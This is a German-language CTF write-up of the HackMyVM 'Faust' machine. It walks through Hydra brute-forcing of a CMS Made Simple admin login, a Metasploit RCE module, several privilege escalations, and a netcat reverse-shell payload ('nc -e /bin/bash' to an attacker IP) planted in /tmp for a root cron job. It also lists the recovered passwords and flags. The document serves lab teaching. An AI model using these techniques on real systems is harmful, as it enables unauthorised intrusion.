# Faust - HackMyVM (Easy)

![Faust.png](Faust.png)

## Übersicht

*   **VM:** Faust
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Faust)
*   **Schwierigkeit:** Easy
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 16. April 2023
*   **Original-Writeup:** https://alientec1908.github.io/Faust_HackMyVM_Easy/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war die Kompromittierung der virtuellen Maschine "Faust". Die Enumeration deckte einen Apache-Webserver (Port 80), einen SSH-Dienst (Port 22) und einen unbekannten Dienst auf Port 6660 auf. Der Dienst auf Port 6660 lieferte einen Hinweis auf den Benutzer `paul`. Eine Web-Enumeration auf Port 80 fand eine `/admin`-Seite. Ein Brute-Force-Angriff mit Hydra auf `/admin/login.php` war erfolgreich und lieferte die Credentials `admin`:`bullshit`. Diese wurden verwendet, um mit einem Metasploit-Exploit für CMS Made Simple (CMSMS) eine RCE zu erlangen und initialen Zugriff als `www-data` zu erhalten.
Die Rechteausweitung umfasste mehrere Schritte:
1.  **www-data -> paul:** Ein Klartext-Passwort für `paul` (`YouCanBecomePaul`) wurde in `/home/paul/password.txt` gefunden.
2.  **paul -> nico:** `paul` durfte `sudo -u nico /usr/bin/base32 /home/nico/.secret.txt` ausführen. Die Base32-kodierte Ausgabe wurde fälschlicherweise als Base64 dekodiert, was das Passwort für `nico` (`just_one_more_beer`) offenbarte.
3.  **nico -> root:** In `/nico/homer.jpg` wurde mittels Steganografie (`stegseek`) eine Nachricht gefunden, die auf `/tmp/goodgame` hinwies. Eine ausführbare Datei `/tmp/goodgame` mit einer Reverse-Shell-Payload wurde erstellt. Diese wurde vermutlich von einem Cronjob als `root` ausgeführt, was zu einer Root-Shell führte.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `gobuster`
*   `nmap`
*   `hydra`
*   `msfconsole` (cmsms_upload_rename_rce)
*   `python3` (pty, http.server)
*   `rm`
*   `cat`
*   `ssh`
*   `sudo`
*   `base32`, `base64`
*   `echo`
*   `su`
*   `wget`
*   `stegsnow`, `stegseek`
*   `chmod`
*   `nc (netcat)`
*   Standard Linux-Befehle (`ls`, `cd`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Faust" gliederte sich in folgende Phasen:

1.  **Reconnaissance:**
    *   IP-Findung mittels `arp-scan` (192.168.2.132).
    *   Portscan mit `nmap` identifizierte Port 22 (SSH OpenSSH 7.9p1), Port 80 (Apache 2.4.38 - CMS Made Simple) und Port 6660 (unbekannter Dienst, der eine Nachricht von "Paul" an "www-data" enthielt).

2.  **Web Enumeration & Initial Access (CMSMS RCE als `www-data`):**
    *   `gobuster` auf Port 80 fand u.a. das Verzeichnis `/admin`.
    *   Ein HTTP-POST-Form-Brute-Force-Angriff mit `hydra` auf `/admin/login.php` für den Benutzer `admin` war erfolgreich und lieferte das Passwort `bullshit`.
    *   Mit `msfconsole` und dem Exploit `exploit/multi/http/cmsms_upload_rename_rce` wurde unter Verwendung der Credentials `admin`:`bullshit` eine Remote Code Execution auf der CMSMS-Instanz erreicht. Dies führte zu einer Meterpreter-Session und anschließend einer Shell als `www-data`.

3.  **Privilege Escalation (von `www-data` zu `paul`):**
    *   Enumeration als `www-data` führte zur Datei `/home/paul/password.txt`, die das Klartext-Passwort `YouCanBecomePaul` enthielt.
    *   Erfolgreicher SSH-Login als `paul` mit diesem Passwort.

4.  **Privilege Escalation (von `paul` zu `nico` via `sudo`/Base64):**
    *   `sudo -l` für `paul` zeigte, dass er `sudo -u nico /usr/bin/base32 /home/nico/.secret.txt` ausführen durfte.
    *   Die Base32-kodierte Ausgabe dieses Befehls wurde mit `base64 -d` (fälschlicherweise, aber erfolgreich) dekodiert und enthüllte das Passwort für `nico`: `just_one_more_beer`.
    *   Mit `su nico` und diesem Passwort wurde zu `nico` gewechselt.

5.  **Privilege Escalation (von `nico` zu `root` via Steganografie & Cronjob/Tmp):**
    *   Im Verzeichnis `/nico` wurde die Datei `homer.jpg` gefunden.
    *   `stegseek` wurde verwendet, um aus `homer.jpg` eine versteckte Datei (`note.txt`) zu extrahieren. Diese enthielt den Hinweis "my /tmp/goodgame file was so good... but I lost it".
    *   Eine ausführbare Datei `/tmp/goodgame` wurde mit einem Netcat-Reverse-Shell-Payload erstellt (`nc -e /bin/bash <ANGREIFER-IP> <PORT>`).
    *   Es wurde angenommen, dass ein Cronjob oder ein ähnlicher Mechanismus diese Datei als `root` ausführt. Nach kurzer Zeit wurde eine Root-Shell auf dem Listener des Angreifers empfangen. Die User- und Root-Flags wurden gelesen.

## Wichtige Schwachstellen und Konzepte

*   **Informationspreisgabe über Netzwerkdienst:** Ein unbekannter Dienst auf Port 6660 lieferte den Benutzernamen `paul`.
*   **Schwache Web-Admin-Passwörter:** Das Admin-Passwort für CMS Made Simple konnte per Brute-Force erraten werden.
*   **Bekannte CVE Ausnutzung (CMSMS RCE):** Eine bekannte RCE-Schwachstelle in CMS Made Simple wurde für den initialen Zugriff genutzt.
*   **Klartext-Passwörter in Dateien:** Passwörter für Benutzer `paul` und (indirekt durch `sudo`-Fehlkonfiguration) `nico` wurden im Klartext bzw. leicht dekodierbar gefunden.
*   **Unsichere `sudo`-Konfigurationen:**
    *   `paul` durfte `base32` auf eine Datei von `nico` ausführen, was (durch fehlerhafte Dekodierung) zur Preisgabe von `nico`s Passwort führte.
*   **Steganografie:** Eine versteckte Nachricht in einer Bilddatei lieferte den entscheidenden Hinweis für die finale Rechteausweitung.
*   **Ausführung von Dateien aus `/tmp` durch privilegierten Prozess:** Ein (vermutlich) Cronjob führte eine Datei aus einem global beschreibbaren Verzeichnis (`/tmp`) als `root` aus, was zur Kompromittierung führte.

## Flags

*   **User Flag (`/home/nico/user.txt` - oder äquivalent, da Bericht ungenau):** `gamhanarhu`
*   **Root Flag (`/root/root.txt`):** `lasarnsilgam`

## Tags

`HackMyVM`, `Faust`, `Easy`, `Nmap`, `Gobuster`, `Hydra`, `Metasploit`, `CMSMS`, `RCE`, `PasswordInFile`, `SudoAbuse`, `Base64`, `Steganography`, `Stegseek`, `TmpExploitation`, `Cronjob`, `Linux`, `Web`, `Privilege Escalation`
